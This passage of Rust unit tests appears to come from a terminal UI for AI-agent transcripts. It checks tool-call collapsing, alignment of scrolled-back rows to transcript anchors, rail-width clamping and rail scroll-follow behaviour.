            user_turn_entry("u", "go"),
            assistant_turn_entry("a", "done"),
        ];
        let after = collapse_for(before.clone(), false, false);
        let anchors = reachable_anchors(&before, &after);
        let user = anchor_named(&anchors, "u");
        let assistant = anchor_named(&anchors, "a");
        assert_eq!(after[user.index].key.as_ref(), "u");
        assert_eq!(after[assistant.index].key.as_ref(), "a");
        assert!(
            after
                .iter()
                .all(|entry| !matches!(entry.kind, EntryKind::TurnSummary { .. })),
            "a turn with no tool call has no summary to point at"
        );
    }

    #[test]
    fn a_collapsed_tool_points_at_its_turn_summary_and_keeps_its_chip() {
        let before = vec![
            user_turn_entry("u", "go"),
            tool_use_turn_entry(
                "first",
                "Read",
                serde_json::json!({"file_path": "a.rs"}),
                "id-1",
            ),
            tool_result_entry("first-out", 1),
            tool_use_turn_entry(
                "second",
                "Read",
                serde_json::json!({"file_path": "b.rs"}),
                "id-2",
            ),
            tool_result_entry("second-out", MAX_UNCLAMPED_OUTPUT_LINES + 1),
        ];
        let after = collapse_for(before.clone(), false, false);
        let summary = after
            .iter()
            .position(|entry| matches!(entry.kind, EntryKind::TurnSummary { .. }))
            .unwrap_or_else(|| panic!("expected a summary"));
        let anchors = reachable_anchors(&before, &after);
        let first = anchor_named(&anchors, "first");
        let second = anchor_named(&anchors, "second");
        let user = anchor_named(&anchors, "u");
        assert_eq!(after[user.index].key.as_ref(), "u");
        assert_ne!(user.index, summary);
        assert_eq!(first.index, summary);
        assert_eq!(second.index, summary);
        assert!(
            !after.iter().any(|entry| entry.key.as_ref() == "second"),
            "the tool entry itself is gone"
        );
        // The long result is gone with the tool, but the chip was read before collapse.
        assert_eq!(second.chip, Some(AnchorChip::ExpandOutput));
        // A one-line result is not an expand chip. Collapsing must not invent one.
        assert_eq!(first.chip, None);
    }

    #[test]
    fn a_running_turn_has_no_summary_so_its_tool_stays_put() {
        let before = vec![
            user_turn_entry("u", "go"),
            Entry {
                key: SharedString::from("think"),
                kind: EntryKind::Thinking {
                    source: SharedString::from("hmm"),
                },
            },
            tool_use_turn_entry(
                "live",
                "Read",
                serde_json::json!({"file_path": "a.rs"}),
                "id",
            ),
        ];
        let after = collapse_for(before.clone(), false, true);
        assert!(
            after
                .iter()
                .all(|entry| !matches!(entry.kind, EntryKind::TurnSummary { .. }))
        );
        let anchors = reachable_anchors(&before, &after);
        let live = anchor_named(&anchors, "live");
        assert_eq!(after[live.index].key.as_ref(), "live");
    }

    #[test]
    fn show_tool_calls_keeps_every_anchor_on_its_own_entry() {
        let before = vec![
            user_turn_entry("u", "go"),
            tool_use_turn_entry(
                "call",
                "Read",
                serde_json::json!({"file_path": "a.rs"}),
                "id",
            ),
            tool_result_entry("out", 1),
        ];
        let after = collapse_for(before.clone(), true, false);
        assert!(
            after.iter().any(|entry| entry.key.as_ref() == "call"),
            "expand-all leaves the tool in the list"
        );
        let anchors = reachable_anchors(&before, &after);
        let call = anchor_named(&anchors, "call");
        assert_eq!(after[call.index].key.as_ref(), "call");
        assert!(
            !matches!(after[call.index].kind, EntryKind::TurnSummary { .. }),
            "the tool is still on screen, so the click must not land on the summary"
        );
    }

    fn anchor_row(row: usize, text: &str) -> terminal_anchors::AnchorRow {
        terminal_anchors::AnchorRow {
            row,
            glyph: terminal_anchors::AnchorGlyph::Assistant,
            text: text.to_string(),
        }
    }

    fn transcript_anchor_row(key: &str, text: &str) -> terminal_anchors::TranscriptAnchor {
        terminal_anchors::TranscriptAnchor {
            key: key.to_string(),
            glyph: terminal_anchors::AnchorGlyph::Assistant,
            text: text.to_string(),
        }
    }

    fn tail_filled_transcript(
        head: Vec<terminal_anchors::TranscriptAnchor>,
    ) -> Vec<terminal_anchors::TranscriptAnchor> {
        let mut transcript = head;
        for index in 0..terminal_anchors::MAX_TRANSCRIPT_ANCHORS {
            transcript.push(transcript_anchor_row(
                &format!("fill-{index}"),
                "othertextvalue",
            ));
        }
        transcript
    }

    fn aligned_keys(
        screen: &[terminal_anchors::AnchorRow],
        transcript: &[terminal_anchors::TranscriptAnchor],
        scrolled_back: bool,
    ) -> Vec<String> {
        let window = transcript_window_for_screen(screen, transcript, scrolled_back);
        terminal_anchors::align(screen, window)
            .into_iter()
            .map(|anchoring| anchoring.key)
            .collect()
    }

    #[test]
    fn a_scrolled_back_screen_keeps_an_anchor_older_than_the_tail_window() {
        let transcript =
            tail_filled_transcript(vec![transcript_anchor_row("old", "uniqueoldanchortext")]);
        let screen = [anchor_row(0, "uniqueoldanchortext")];
        assert_eq!(
            aligned_keys(&screen, &transcript, true),
            vec!["old".to_string()]
        );
    }

    #[test]
    fn a_scrolled_back_screen_pairs_a_repeated_line_with_the_copy_beside_the_old_one() {
        let transcript = tail_filled_transcript(vec![
            transcript_anchor_row("old", "uniqueoldanchortext"),
            transcript_anchor_row("old-read", "Read(auth.rs)"),
        ]);
        // The filler window also contains this text, so the tail matches the wrong copy.
        let transcript = {
            let mut transcript = transcript;
            let last = transcript.len().saturating_sub(1);
            transcript[last] = transcript_anchor_row("new-read", "Read(auth.rs)");
            transcript
        };
        let screen = [
            anchor_row(0, "uniqueoldanchortext"),
            anchor_row(1, "Read(auth.rs)"),
        ];
        assert_eq!(
            aligned_keys(&screen, &transcript, true),
            vec!["old".to_string(), "old-read".to_string()]
        );
    }

    #[test]
    fn the_tail_window_stays_when_the_screen_is_not_scrolled_back() {
        let transcript =
            tail_filled_transcript(vec![transcript_anchor_row("old", "uniqueoldanchortext")]);
        let screen = [anchor_row(0, "uniqueoldanchortext")];
        assert!(aligned_keys(&screen, &transcript, false).is_empty());

        let mut recent = tail_filled_transcript(Vec::new());
        recent.push(transcript_anchor_row("newest", "uniqueoldanchortext"));
        let screen = [anchor_row(4, "uniqueoldanchortext")];
        assert_eq!(
            aligned_keys(&screen, &recent, true),
            vec!["newest".to_string()],
            "a line that is already in the tail must not be dropped for an older window"
        );

        let short = vec![
            transcript_anchor_row("only", "uniqueoldanchortext"),
            transcript_anchor_row("next", "othertextvalue"),
        ];
        assert_eq!(
            aligned_keys(&screen, &short, true),
            vec!["only".to_string()]
        );
    }

    #[test]
    fn a_scrolled_back_span_of_one_window_is_covered_in_full() {
        let mut transcript = Vec::new();
        let mut screen = Vec::new();
        for index in 0..terminal_anchors::MAX_TRANSCRIPT_ANCHORS {
            let text = format!("uniqueline{index:04}");
            transcript.push(transcript_anchor_row(&format!("key-{index}"), &text));
            screen.push(anchor_row(index, &text));
        }
        transcript.push(transcript_anchor_row("newer", "othertextvalue"));
        assert_eq!(
            aligned_keys(&screen, &transcript, true),
            (0..terminal_anchors::MAX_TRANSCRIPT_ANCHORS)
                .map(|index| format!("key-{index}"))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_scrolled_back_span_longer_than_one_window_keeps_the_newer_side() {
        let count = terminal_anchors::MAX_TRANSCRIPT_ANCHORS + 1;
        let mut transcript = Vec::new();
        let mut screen = Vec::new();
        for index in 0..count {
            let text = format!("uniqueline{index:04}");
            transcript.push(transcript_anchor_row(&format!("key-{index}"), &text));
            screen.push(anchor_row(index, &text));
        }
        let keys = aligned_keys(&screen, &transcript, true);
        assert_eq!(keys.len(), terminal_anchors::MAX_TRANSCRIPT_ANCHORS);
        assert_eq!(keys.first().map(String::as_str), Some("key-1"));
        assert_eq!(keys.last().map(String::as_str), Some("key-512"));
        assert!(!keys.iter().any(|key| key == "key-0"));
    }

    #[test]
    fn an_anchor_before_the_first_turn_is_not_sent_to_a_later_summary() {
        let before = vec![
            assistant_turn_entry("preface", "hello there friend"),
            user_turn_entry("u", "go"),
            tool_use_turn_entry("t", "Read", serde_json::json!({"file_path": "a.rs"}), "id"),
            tool_result_entry("out", 1),
        ];
        let after = collapse_for(before.clone(), false, false);
        let anchors = reachable_anchors(&before, &after);
        let preface = anchor_named(&anchors, "preface");
        assert_eq!(after[preface.index].key.as_ref(), "preface");
    }

    fn call_index_of(entries: &[Entry], wanted: &str) -> usize {
        entries
            .iter()
            .position(|entry| {
                matches!(
                    &entry.kind,
                    EntryKind::ToolUse { id: Some(id), .. } if id.as_ref() == wanted
                )
            })
            .unwrap_or_else(|| panic!("missing call {wanted}"))
    }

    #[test]
    fn a_result_that_leads_with_its_image_keeps_it_on_its_own_call() {
        // The content blocks are walked in order and the pending text is flushed the
        // moment an image is reached, so an image written before the text lands in
        // front of the `ToolResult` that carries the id.
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"call-a","name":"Read","input":{"file_path":"shot.png"}}]}}"#,
            r#"{"type":"user","uuid":"b","message":{"content":[{"type":"tool_result","tool_use_id":"call-a","content":[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAABBBB"}},{"type":"text","text":"see this"}]}]}}"#,
        ]);
        assert!(
            entries
                .iter()
                .any(|entry| matches!(entry.kind, EntryKind::Image { .. })),
            "the record has to produce an image entry for this to be about anything"
        );
        let call = call_index_of(&entries, "call-a");
        assert_eq!(
            anchored_chip(&entries[call].kind, call_results(&entries, call)),
            Some(AnchorChip::Image),
            "the image is this call's output even though it was written before the text"
        );
    }

    /// The boundary added for the test above reaches backwards, so it has to stop
    /// before an image that a previous result left behind.
    #[test]
    fn a_call_does_not_take_the_image_the_previous_result_left_behind() {
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"call-a","name":"Read","input":{"file_path":"a.png"}},{"type":"tool_use","id":"call-b","name":"Bash","input":{"command":"true"}}]}}"#,
            r#"{"type":"user","uuid":"b","message":{"content":[{"type":"tool_result","tool_use_id":"call-a","content":[{"type":"text","text":"one"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAABBBB"}}]},{"type":"tool_result","tool_use_id":"call-b","content":"two"}]}}"#,
        ]);
        let first = call_index_of(&entries, "call-a");
        let second = call_index_of(&entries, "call-b");
        assert_eq!(
            anchored_chip(&entries[first].kind, call_results(&entries, first)),
            Some(AnchorChip::Image),
            "the image was written after call-a's own text"
        );
        assert_eq!(
            anchored_chip(&entries[second].kind, call_results(&entries, second)),
            None,
            "call-b's result is one short line; the image in front of it is call-a's"
        );
    }

    fn identified_result_entry(key: &str, id: &str) -> Entry {
        Entry {
            key: SharedString::from(key.to_string()),
            kind: EntryKind::ToolResult {
                label: SharedString::from("Read"),
                is_error: false,
                body: ToolResultBody::Inline(SharedString::from("ok")),
                tool_use_id: Some(SharedString::from(id.to_string())),
            },
        }
    }

    /// `reachable_anchors` runs on every rebuild, which is every 250 ms on the
    /// foreground thread. Pairing a call with its result by scanning the whole
    /// conversation for each call makes that pass quadratic in the session's length.
    #[test]
    fn the_anchor_pass_does_not_rescan_the_conversation_for_every_call() {
        const CALLS: usize = 8000;
        let mut before = Vec::with_capacity(CALLS * 3);
        for index in 0..CALLS {
            before.push(user_turn_entry(&format!("u{index}"), "go"));
            before.push(tool_use_turn_entry(
                &format!("t{index}"),
                "Read",
                serde_json::json!({}),
                &format!("toolu_01A09q90qw90lq917835lq{index:06}"),
            ));
            before.push(identified_result_entry(
                &format!("r{index}"),
                &format!("toolu_01A09q90qw90lq917835lq{index:06}"),
            ));
        }
        let after = before.clone();

        let started = std::time::Instant::now();
        let anchors = reachable_anchors(&before, &after);
        let elapsed = started.elapsed();

        assert_eq!(
            anchors.len(),
            CALLS * 2,
            "every message and call is an anchor"
        );
        let budget = std::time::Duration::from_millis(110);
        assert!(
            elapsed < budget,
            "the anchor pass over {} entries took {elapsed:?}, budget {budget:?}",
            before.len()
        );
    }

    /// The window search runs on every frame the terminal spends scrolled back, so it
    /// must not build a fresh skeleton for both sides of every comparison the way
    /// `rows_match` does; `align` precomputes its skeletons for the same reason.
    #[test]
    fn choosing_a_window_skeletonises_each_row_once() {
        const ANCHORS: usize = 20000;
        let transcript = (0..ANCHORS)
            .map(|index| {
                transcript_anchor_row(
                    &format!("key-{index}"),
                    &format!("Read(src/module{index}/file{index}.rs)"),
                )
            })
            .collect::<Vec<_>>();
        let screen = (0..20)
            .map(|index| {
                anchor_row(
                    index,
                    &format!("Read(src/module{}/file{}.rs)", index + 100, index + 100),
                )
            })
            .collect::<Vec<_>>();

        let started = std::time::Instant::now();
        let window = transcript_window_for_screen(&screen, &transcript, true);
        let elapsed = started.elapsed();

        assert_eq!(window.len(), terminal_anchors::MAX_TRANSCRIPT_ANCHORS);
        assert_eq!(
            window.first().map(|anchor| anchor.key.as_str()),
            Some("key-100"),
            "the window starts at the oldest visible row"
        );
        let budget = std::time::Duration::from_millis(300);
        assert!(
            elapsed < budget,
            "choosing a window over {ANCHORS} anchors took {elapsed:?}, budget {budget:?}"
        );
    }

    fn anchoring(row: usize, key: &str) -> Anchoring {
        Anchoring {
            row,
            key: key.to_string(),
        }
    }

    fn reachable_anchor(key: &str, index: usize) -> ReachableAnchor {
        ReachableAnchor {
            anchor: terminal_anchors::TranscriptAnchor {
                key: key.to_string(),
                glyph: terminal_anchors::AnchorGlyph::Assistant,
                text: String::new(),
            },
            index,
            chip: None,
        }
    }

    #[test]
    fn clamped_rail_width_keeps_the_default_when_the_pane_is_wide() {
        let available = unconstrained_rail_budget();
        assert_eq!(
            clamped_rail_width(px(RAIL_WIDTH_DEFAULT_PIXELS), available),
            px(RAIL_WIDTH_DEFAULT_PIXELS)
        );
    }

    #[test]
    fn clamped_rail_width_keeps_both_ends_of_the_range() {
        let available = unconstrained_rail_budget();
        assert_eq!(
            clamped_rail_width(px(RAIL_WIDTH_MIN_PIXELS), available),
            px(RAIL_WIDTH_MIN_PIXELS)
        );
        assert_eq!(
            clamped_rail_width(px(RAIL_WIDTH_MAX_PIXELS), available),
            px(RAIL_WIDTH_MAX_PIXELS)
        );
    }

    #[test]
    fn clamped_rail_width_keeps_a_rail_that_leaves_the_terminal_exactly_320() {
        // 900 + 320. The terminal floor is inclusive: 900 must not be pulled down.
        let available = px(RAIL_WIDTH_MAX_PIXELS + TERMINAL_MIN_WIDTH_PIXELS);
        assert_eq!(
            clamped_rail_width(px(RAIL_WIDTH_MAX_PIXELS), available),
            px(RAIL_WIDTH_MAX_PIXELS)
        );
    }

    #[test]
    fn clamped_rail_width_keeps_240_when_that_leaves_the_terminal_exactly_320() {
        let available = px(RAIL_WIDTH_MIN_PIXELS + TERMINAL_MIN_WIDTH_PIXELS);
        assert_eq!(
            clamped_rail_width(px(RAIL_WIDTH_MIN_PIXELS), available),
            px(RAIL_WIDTH_MIN_PIXELS)
        );
    }

    #[test]
    fn clamped_rail_width_keeps_a_subpixel_width() {
        let available = unconstrained_rail_budget();
        assert_eq!(clamped_rail_width(px(380.5), available), px(380.5));
    }

    #[test]
    fn clamped_rail_width_pulls_an_out_of_range_request_onto_the_ends() {
        let available = unconstrained_rail_budget();
        assert_eq!(
            clamped_rail_width(px(RAIL_WIDTH_MIN_PIXELS - 1.), available),
            px(RAIL_WIDTH_MIN_PIXELS)
        );
        assert_eq!(
            clamped_rail_width(px(RAIL_WIDTH_MAX_PIXELS + 1.), available),
            px(RAIL_WIDTH_MAX_PIXELS)
        );
    }

    #[test]
    fn clamped_rail_width_shrinks_the_rail_so_the_terminal_stays_at_least_320() {
        // 1000 - 320 = 680, inside 240..=900, so 800 is the request that has to give way.
        let available = px(1000.);
        assert_eq!(clamped_rail_width(px(800.), available), px(680.));
    }

    #[test]
    fn clamped_rail_width_lets_the_rail_go_below_240_when_both_floors_cannot_hold() {
        // 500 - 320 = 180. Raising that to 240 would leave the terminal at 260.
        let available = px(500.);
        assert_eq!(clamped_rail_width(px(100.), available), px(180.));
        assert_eq!(clamped_rail_width(px(200.), available), px(180.));
    }

    #[test]
    fn clamped_rail_width_does_not_go_negative_when_the_row_cannot_hold_the_terminal() {
        let available = px(100.);
        assert_eq!(clamped_rail_width(px(380.), available), px(0.));
        assert_eq!(clamped_rail_width(px(0.), px(0.)), px(0.));
    }

    #[test]
    fn clamped_rail_width_keeps_one_pixel_above_the_rail_floor_when_the_terminal_allows_it() {
        // 561 - 320 = 241. 241 is inside 240..=900 and must not snap to 240.
        let available = px(RAIL_WIDTH_MIN_PIXELS + TERMINAL_MIN_WIDTH_PIXELS + 1.);
        assert_eq!(clamped_rail_width(px(241.), available), px(241.));
    }

    #[test]
    fn terminal_and_rail_budget_reserves_the_handle_and_the_gutter_only_when_it_is_shown() {
        assert_eq!(
            terminal_and_rail_budget(px(1000.), true),
            px(1000. - RAIL_RESIZE_HANDLE_PIXELS - ANCHOR_GUTTER_WIDTH_PIXELS)
        );
        assert_eq!(
            terminal_and_rail_budget(px(1000.), false),
            px(1000. - RAIL_RESIZE_HANDLE_PIXELS)
        );
    }

    #[test]
    fn forgetting_the_handle_would_leave_the_terminal_under_320() {
        // Row is 240 + 320 + 6. With the handle reserved, a request of 246 clamps to 240
        // and the terminal stays at 320. Leaving the handle out of the budget would
        // accept 246 and leave the terminal at 314.
        let row = px(RAIL_WIDTH_MIN_PIXELS + TERMINAL_MIN_WIDTH_PIXELS + RAIL_RESIZE_HANDLE_PIXELS);
        let budget = terminal_and_rail_budget(row, false);
        assert_eq!(
            budget,
            px(RAIL_WIDTH_MIN_PIXELS + TERMINAL_MIN_WIDTH_PIXELS)
        );
        assert_eq!(
            clamped_rail_width(px(246.), budget),
            px(RAIL_WIDTH_MIN_PIXELS)
        );
    }

    #[test]
    fn reserving_a_missing_gutter_would_reject_a_legal_rail_width() {
        // Row is 240 + 320 + 6 + 28. No gutter is drawn, so 268 must survive.
        // Subtracting the gutter anyway would clamp 268 down to 240.
        let row = px(RAIL_WIDTH_MIN_PIXELS
            + TERMINAL_MIN_WIDTH_PIXELS
            + RAIL_RESIZE_HANDLE_PIXELS
            + ANCHOR_GUTTER_WIDTH_PIXELS);
        let budget = terminal_and_rail_budget(row, false);
        assert_eq!(clamped_rail_width(px(268.), budget), px(268.));
    }

    #[test]
    fn anchored_on_screen_keys_is_empty_when_nothing_is_aligned() {
        let keys = anchored_on_screen_keys(&[]);
        assert!(keys.is_empty());
    }

    #[test]
    fn anchored_on_screen_keys_keeps_every_distinct_key_including_an_empty_one() {
        let keys = anchored_on_screen_keys(&[
            anchoring(0, "alpha"),
            anchoring(2, "alpha"),
            anchoring(3, ""),
            anchoring(4, "beta"),
        ]);
        assert!(keys.contains("alpha"));
        assert!(keys.contains(""));
        assert!(keys.contains("beta"));
        assert!(!keys.contains("absent"));
        assert_eq!(keys.len(), 3);
    }

    #[test]
    fn rail_follow_index_stays_none_while_the_terminal_is_live() {
        let anchorings = [anchoring(0, "alpha")];
        let reachable = [reachable_anchor("alpha", 0)];
        assert_eq!(rail_follow_index(&anchorings, &reachable, false, 1), None);
    }

    #[test]
    fn rail_follow_index_uses_the_top_row_even_when_it_is_not_first_or_index_zero() {
        let anchorings = [
            anchoring(5, "lower"),
            anchoring(0, "top"),
            anchoring(2, "mid"),
        ];
        let reachable = [
            reachable_anchor("lower", 1),
            reachable_anchor("top", 4),
            reachable_anchor("mid", 2),
        ];
        assert_eq!(rail_follow_index(&anchorings, &reachable, true, 5), Some(4));
    }

    #[test]
    fn rail_follow_index_keeps_index_zero_and_the_last_in_range_index() {
        let anchorings = [anchoring(0, "first")];
        let reachable = [reachable_anchor("first", 0)];
        assert_eq!(rail_follow_index(&anchorings, &reachable, true, 1), Some(0));

        let anchorings = [anchoring(1, "last")];
        let reachable = [reachable_anchor("last", 3)];
        assert_eq!(rail_follow_index(&anchorings, &reachable, true, 4), Some(3));
    }

    #[test]
    fn rail_follow_index_rejects_an_index_past_the_entries() {
        let anchorings = [anchoring(0, "past")];
        let reachable = [reachable_anchor("past", 2)];
        assert_eq!(rail_follow_index(&anchorings, &reachable, true, 2), None);
    }

    #[test]
    fn rail_follow_index_is_none_when_the_screen_has_no_anchors() {
        let reachable = [reachable_anchor("alpha", 0)];
        assert_eq!(rail_follow_index(&[], &reachable, true, 1), None);
    }

    #[test]
    fn rail_follow_index_does_not_substitute_a_lower_row_when_the_top_key_is_missing() {
        let anchorings = [anchoring(0, "missing"), anchoring(3, "present")];
        let reachable = [reachable_anchor("present", 1)];
        assert_eq!(rail_follow_index(&anchorings, &reachable, true, 2), None);
    }

    #[test]
    fn rail_follow_index_uses_a_later_anchor_on_the_same_top_row() {
        let anchorings = [
            anchoring(0, "missing"),
            anchoring(0, "present"),
            anchoring(4, "lower"),
        ];
        let reachable = [reachable_anchor("present", 2), reachable_anchor("lower", 0)];
        assert_eq!(rail_follow_index(&anchorings, &reachable, true, 3), Some(2));
    }

    #[test]
    fn rail_follow_index_skips_an_out_of_range_duplicate_and_keeps_the_in_range_one() {
        let anchorings = [anchoring(1, "same")];
        let reachable = [reachable_anchor("same", 5), reachable_anchor("same", 1)];
        assert_eq!(rail_follow_index(&anchorings, &reachable, true, 3), Some(1));
        let both_in_range = [reachable_anchor("same", 1), reachable_anchor("same", 2)];
        assert_eq!(
            rail_follow_index(&anchorings, &both_in_range, true, 3),
            Some(1)
        );
    }

    #[test]
    fn rail_follow_scroll_reveals_a_new_index_and_index_zero() {
        assert_eq!(rail_follow_scroll(None, Some(0), true), Some(0));
        assert_eq!(rail_follow_scroll(Some(3), Some(4), true), Some(4));
    }

    #[test]
    fn rail_follow_scroll_does_not_repeat_the_index_it_already_followed() {
        assert_eq!(rail_follow_scroll(Some(0), Some(0), true), None);
        assert_eq!(rail_follow_scroll(Some(4), Some(4), true), None);
    }

    #[test]
    fn rail_follow_scroll_does_not_scroll_while_the_terminal_is_live() {
        assert_eq!(rail_follow_scroll(None, Some(0), false), None);
        assert_eq!(rail_follow_scroll(Some(4), Some(4), false), None);
    }

    #[test]
    fn rail_follow_scroll_scrolls_again_after_the_followed_index_was_cleared() {
        assert_eq!(rail_follow_scroll(Some(4), None, true), None);
        assert_eq!(rail_follow_scroll(None, Some(4), true), Some(4));
    }

    #[test]
    fn hover_anchor_changed_is_false_only_when_the_key_is_the_same() {
        assert!(!hover_anchor_changed(None, None));
        assert!(!hover_anchor_changed(Some("alpha"), Some("alpha")));
        assert!(!hover_anchor_changed(Some(""), Some("")));
        assert!(hover_anchor_changed(None, Some("")));
        assert!(hover_anchor_changed(Some("alpha"), None));
        assert!(hover_anchor_changed(None, Some("alpha")));
        assert!(hover_anchor_changed(Some("alpha"), Some("beta")));
        assert!(hover_anchor_changed(Some("ab"), Some("a")));
    }
}
